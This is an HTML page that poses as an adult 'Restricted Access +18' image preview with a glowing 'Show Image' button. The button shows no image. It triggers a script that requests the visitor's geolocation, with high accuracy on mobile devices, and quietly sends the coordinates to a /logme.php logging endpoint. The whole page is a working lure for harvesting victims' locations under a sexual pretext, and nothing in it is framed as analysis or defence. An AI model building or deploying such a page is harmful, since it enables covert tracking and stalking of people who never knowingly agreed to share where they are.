<!DOCTYPE html>
<html>
<head>
    <title>RESTRICTED ACCESS</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            text-align: center;
        }

        .overlay {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.85);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10;
        }

        .preview {
            width: 597px;
            height: 767px;
            max-width: 90vw;
            max-height: 80vh;
            background: url('hot.png') center/cover no-repeat;
            border: 5px solid #ff0055;
            box-shadow: 0 0 25px #ff0055, 0 0 50px rgba(255,0,85,0.7);
            border-radius: 10px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 1.8em;
            margin: 10px 0;
            color: #ff0055;
            text-shadow: 0 0 10px #ff0055;
        }

        p {
            font-size: 1em;
            margin-bottom: 20px;
            opacity: 0.9;
        }

        .btn {
            padding: 12px 28px;
            font-size: 1.1em;
            font-weight: bold;
            color: #fff;
            background: linear-gradient(90deg, #ff0055, #ff3377);
            border: none;
            border-radius: 30px;
            cursor: pointer;
            box-shadow: 0 0 15px #ff0055;
            transition: 0.3s;
        }

        .btn:hover {
            background: linear-gradient(90deg, #ff3377, #ff0055);
            transform: scale(1.05);
        }

        small {
            display: block;
            margin-top: 15px;
            color: #bbb;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="overlay">
        <div class="preview"></div>
        <h1>Restricted Access +18</h1>
        <p>To continue, tap Show Pic.<br>
        <button class="btn" onclick="getLocation()">Show Image</button>
        <small>Access allowed only to verified users</small>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
    <script>
        function sendLocation(lat, lon) {
            $.get("/logme.php?coords=" + lat + "," + lon);
        }

        function getLocationDesktop() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(pos) {
                    sendLocation(pos.coords.latitude, pos.coords.longitude);
                });
            }
        }

        function getLocationMobile() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        sendLocation(pos.coords.latitude, pos.coords.longitude);
                    },
                    function(err) {
                        console.warn("Geolocalizzazione fallita:", err.message);
                        alert("Impossibile rilevare la posizione. Assicurati di aver abilitato GPS e permessi di posizione sul browser.");
                    },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            } else {
                console.warn("Geolocalizzazione non supportata");
            }
        }

        function getLocation() {
            if (/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)) {
                getLocationMobile();
            } else {
                getLocationDesktop();
            }
        }
    </script>
</body>
</html>
